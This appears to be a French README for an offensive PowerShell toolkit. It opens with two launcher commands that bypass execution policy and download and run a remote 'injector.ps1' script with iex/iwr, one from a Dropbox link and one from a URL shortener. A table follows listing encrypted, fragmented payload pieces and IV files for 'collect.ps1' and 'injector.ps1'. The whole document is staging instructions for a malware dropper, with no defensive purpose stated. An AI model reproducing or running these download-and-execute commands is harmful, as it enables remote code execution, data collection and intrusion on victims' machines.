
## Lanceur 

1) Commande initiale

    ```
    powershell.exe -ep bypass -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (iwr -UseBasicParsing 'https://www.dropbox.com/scl/fi/pnnw05drhtup1r6zu8v5a/injector.ps1?rlkey=h7m4qdlub5ph5gdhghxrgsqg4&st=zcnyosfp&dl=1')")))
    ```
2) Variante

    ```
    powershell.exe -ep bypass -EncodedCommand ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("iex (iwr -UseBasicParsing 'https://urls.fr/bBBMfW')")))
    ```

## Table des liens

### collect.ps1

| Fichier | Lien | Lien shorté |
|---------|------|-------------|
| [collect.enc]( ) | [lien]() | [lien]() |
| [frag1.txt](./encryptor/encrypted_scripts/collect/frag1.txt) | [lien]() | [lien]() |
| [frag2.txt](./encryptor/encrypted_scripts/collect/frag2.txt) | [lien]() | [lien]() |
| [frag3.txt](./encryptor/encrypted_scripts/collect/frag3.txt) | [lien]() | [lien]() |
| [iv.txt](./encryptor/encrypted_scripts/collect/iv.txt) | [lien]() |[lien]() |

### injector.ps1

| Fichier | Lien | Lien shorté |
|---------|------|-------------|
| [injector.enc](./encryptor/encrypted_scripts/injector/injector.enc) | [lien]() | [lien]() |
| [frag1.txt](./encryptor/encrypted_scripts/injector/frag1.txt) | [lien]() | [lien]() |
| [frag2.txt](./encryptor/encrypted_scripts/injector/frag2.txt) | [lien]() | [lien]() |
| [frag3.txt](./encryptor/encrypted_scripts/injector/frag3.txt) | [lien]() | [lien]() |
| [iv.txt](./encryptor/encrypted_scripts/injector/iv.txt) | [lien]() | [lien]() |
